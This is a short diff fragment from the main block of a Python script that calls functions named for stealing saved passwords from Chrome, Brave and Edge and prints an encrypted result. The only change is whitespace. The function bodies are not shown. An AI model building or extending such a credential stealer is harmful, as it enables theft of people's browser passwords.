@@ -378,4 +378,4 @@ if __name__ == "__main__":
     chrome_pass_stealler()
     brave_pass_stealler()
     edge_pass_stealler()
-print(encrypt(RESULT))
+print(encrypt(RESULT)) 
